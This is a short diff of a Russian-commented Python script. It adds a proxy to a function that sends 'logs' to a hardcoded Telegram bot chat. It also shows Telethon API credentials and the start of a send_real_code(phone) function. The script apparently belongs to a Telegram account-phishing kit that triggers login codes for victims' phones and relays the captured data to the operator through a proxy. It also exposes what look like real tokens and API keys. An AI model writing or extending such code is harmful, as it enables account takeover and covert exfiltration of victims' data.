@@ -12,13 +12,23 @@ CHAT_ID = "9264156701:AAFS9etlfwo0SFR-fafjyeqlhF-bpF7qEEw"
 API_ID = 39783565  # Замени на свой api_id (число)
 API_HASH = "5bae681a16b28c835037f5272f04267c"  # Замени на свой api_hash
 
+PROXY = "IP:PORT"  # <--- ВСТАВЬ СЮДА СВОЙ ПРОКСИ (например, "188.163.170.130:41258")
+
 def send_to_tg(message):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": message}
+    
+    proxies = {
+        "http": f"http://{PROXY}",
+        "https": f"http://{PROXY}"
+    } if PROXY else None
+
     try:
-        requests.post(url, json=payload, timeout=5)
+        response = requests.post(url, json=payload, proxies=proxies, timeout=10)
+        print("Лог отправлен:", response.text)
     except Exception as e:
-        print("Ошибка отправки в ТГ:", e)
+        print("Ошибка отправки:", e)
+
 
 # Вспомогательная функция для запуска асинхронного кода Telethon
 def send_real_code(phone):
